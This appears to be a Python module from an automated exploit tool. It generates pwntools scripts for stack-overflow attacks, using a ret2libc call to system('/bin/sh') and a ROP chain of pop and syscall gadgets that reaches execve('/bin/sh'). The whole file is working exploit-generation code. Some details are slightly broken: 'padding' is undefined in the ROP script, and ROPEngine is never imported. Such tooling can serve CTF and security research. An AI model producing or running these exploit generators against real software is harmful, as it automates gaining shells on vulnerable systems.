"""
Advanced exploitation strategy methods for Auto-Exploiter
"""

from typing import List


class ExploitStrategies:
    """Additional exploitation strategies for Auto-Exploiter"""
    
    def _generate_ret2libc_strategy(self, script: List[str], offset: int, arch: str) -> None:
        """
        Generate ret2libc exploitation strategy
        
        Uses system() or execve() from libc to get a shell
        """
        script.append("# Strategy: ret2libc")
        script.append("# Call system('/bin/sh') using libc functions")
        script.append("")
        script.append(f"offset = {offset}")
        script.append("")
        script.append("# Find libc base and system address")
        script.append("libc = elf.libc")
        script.append("system_addr = libc.symbols['system']")
        script.append("bin_sh_addr = next(libc.search(b'/bin/sh'))")
        script.append("")
        script.append("# Build payload")
        script.append("padding = b'A' * offset")
        
        if arch == 'i386':
            script.append("# x86: system(addr_of_bin_sh)")
            script.append("# Stack: [system_addr][fake_ret][arg1]")
            script.append("payload = padding + p32(system_addr) + p32(0xdeadbeef) + p32(bin_sh_addr)")
        else:
            script.append("# x64: Need ROP to set rdi = addr_of_bin_sh")
            script.append("# Find pop rdi gadget")
            script.append("rop = ROP(elf)")
            script.append("rop.call(system_addr, [bin_sh_addr])")
            script.append("payload = padding + rop.chain()")
    
    def _generate_rop_strategy(self, script: List[str], offset: int, arch: str, binary_path: str) -> None:
        """
        Generate ROP chain exploitation strategy
        
        Builds a ROP chain to call execve('/bin/sh', NULL, NULL)
        """
        script.append("# Strategy: ROP Chain")
        script.append("# Build ROP chain for execve('/bin/sh', NULL, NULL)")
        script.append("")
        script.append(f"offset = {offset}")
        script.append("")
        
        # Initialize ROP engine
        if not self.rop_engine:
            self.rop_engine = ROPEngine(binary_path)
        
        # Find gadgets
        gadgets = self.rop_engine.find_gadgets()
        
        if not gadgets:
            script.append("# Warning: No ROP gadgets found!")
            script.append("# Falling back to basic overflow")
            return
        
        script.append("# Find /bin/sh string in libc")
        script.append("libc = elf.libc")
        script.append("bin_sh = next(libc.search(b'/bin/sh'))")
        script.append("")
        
        # Try to build execve chain
        script.append("# Build ROP chain")
        script.append("rop = ROP(elf)")
        
        if arch == 'amd64':
            script.append("# x64 execve syscall")
            script.append("# rax = 59, rdi = '/bin/sh', rsi = 0, rdx = 0")
            
            # Check if we have the gadgets
            pop_rdi = self.rop_engine.find_pop_gadget('rdi')
            pop_rsi = self.rop_engine.find_pop_gadget('rsi')
            pop_rdx = self.rop_engine.find_pop_gadget('rdx')
            pop_rax = self.rop_engine.find_pop_gadget('rax')
            syscall = self.rop_engine.find_syscall_gadget()
            
            if all([pop_rdi, pop_rsi, pop_rdx, pop_rax, syscall]):
                script.append(f"# Found all required gadgets!")
                script.append(f"pop_rdi = {hex(pop_rdi.address)}")
                script.append(f"pop_rsi = {hex(pop_rsi.address)}")
                script.append(f"pop_rdx = {hex(pop_rdx.address)}")
                script.append(f"pop_rax = {hex(pop_rax.address)}")
                script.append(f"syscall = {hex(syscall.address)}")
                script.append("")
                script.append("# Build chain manually")
                script.append("payload = padding")
                script.append("payload += p64(pop_rdi) + p64(bin_sh)")
                script.append("payload += p64(pop_rsi) + p64(0)")
                script.append("payload += p64(pop_rdx) + p64(0)")
                script.append("payload += p64(pop_rax) + p64(59)")
                script.append("payload += p64(syscall)")
            else:
                script.append("# Using pwntools ROP")
                script.append("rop.execve(bin_sh, 0, 0)")
                script.append("payload = padding + rop.chain()")
        else:
            script.append("# x86 int 0x80 syscall")
            script.append("rop.execve(bin_sh, 0, 0)")
            script.append("payload = padding + rop.chain()")
